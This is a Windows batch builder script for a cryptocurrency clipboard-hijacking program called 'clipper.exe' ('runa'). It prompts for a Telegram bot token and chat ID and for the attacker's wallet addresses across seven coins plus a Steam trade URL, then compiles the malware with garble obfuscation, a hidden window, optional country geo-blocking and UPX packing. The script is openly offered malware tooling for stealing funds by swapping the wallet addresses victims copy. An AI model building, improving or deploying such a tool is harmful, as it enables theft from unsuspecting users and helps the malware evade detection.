@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

cls

echo.
echo    _ __ _   _ _ __   __ _
echo   ^| '__^| ^| ^| ^| '_ \ / _` ^|
echo   ^| ^|  ^| ^|_^| ^| ^| ^| ^| (_^| ^|
echo   ^|_^|   \__,_^|_^| ^|_^ \__,_^| builder
echo.

go install mvdan.cc/garble@latest
if errorlevel 1 (
    echo Failed to install garble
    pause
    exit /b 1
)

echo.
set /p "BOT_TOKEN=Bot token: "
set /p "CHAT_ID=Chat ID: "

echo.

set /p "BTC=BTC address: "
set /p "ETH=ETH address: "
set /p "LTC=LTC address: "
set /p "DOGE=DOGE address: "
set /p "TON=TON address: "
set /p "USDT=USDT TRC address: "
set /p "SOL=SOL address: "

echo.

set /p "STEAM=Steam trade url: "

echo.

echo Enter country codes to block (ISO 3166-1 alpha-2)
echo Example: RU,KZ,BY,UA,MD
echo Press Enter to skip
set /p "GEO_BLOCK=Geo block: "

cls

echo.
echo    _ __ _   _ _ __   __ _
echo   ^| '__^| ^| ^| ^| '_ \ / _` ^|
echo   ^| ^|  ^| ^|_^| ^| ^| ^| ^| (_^| ^|
echo   ^|_^|   \__,_^|_^| ^|_^ \__,_^| building...
echo.

set "LDFLAGS=-s -w -X main.bot_token=%BOT_TOKEN%"
set "LDFLAGS=%LDFLAGS% -X main.chat_id=%CHAT_ID%"
set "LDFLAGS=%LDFLAGS% -X main.BtcAddr=%BTC%"
set "LDFLAGS=%LDFLAGS% -X main.EthAddr=%ETH%"
set "LDFLAGS=%LDFLAGS% -X main.LtcAddr=%LTC%"
set "LDFLAGS=%LDFLAGS% -X main.DogeAddr=%DOGE%"
set "LDFLAGS=%LDFLAGS% -X main.TonAddr=%TON%"
set "LDFLAGS=%LDFLAGS% -X main.UsdtTrcAddr=%USDT%"
set "LDFLAGS=%LDFLAGS% -X main.SolAddr=%SOL%"
set "LDFLAGS=%LDFLAGS% -X main.SteamAddr=%STEAM%"

if defined GEO_BLOCK (
    set "GEO_BLOCK_CLEAN=!GEO_BLOCK!"
    set "GEO_BLOCK_CLEAN=!GEO_BLOCK_CLEAN:"=!"
    set "GEO_BLOCK_CLEAN=!GEO_BLOCK_CLEAN: =!"
    
    if not "!GEO_BLOCK_CLEAN!"=="" (
        set "LDFLAGS=!LDFLAGS! -X main.blockedGeos=!GEO_BLOCK_CLEAN!"
    )
)

garble -seed=random -tiny build -ldflags="-H windowsgui !LDFLAGS!" -o clipper.exe
if errorlevel 1 (
    echo Build failed
    pause
    exit /b 1
)

cls

echo.
echo    _ __ _   _ _ __   __ _
echo   ^| '__^| ^| ^| ^| '_ \ / _` ^|
echo   ^| ^|  ^| ^|_^| ^| ^| ^| ^| (_^| ^|
echo   ^|_^|   \__,_^|_^| ^|_^ \__,_^| build completed
echo.

echo Build successful! File: .\clipper.exe

echo.
set /p "USE_UPX=Use UPX? (y/n): "

if /i "!USE_UPX!"=="y" (
    echo.
    
    if exist ".\upx.exe" (
        .\upx.exe --best clipper.exe
        if errorlevel 1 (
            echo UPX compression failed
        ) else (
            echo UPX compression successful  
        )
    ) else (
        echo UPX not found in current directory
        echo Please ensure upx.exe is in the same folder as this script
    )
)

echo.
pause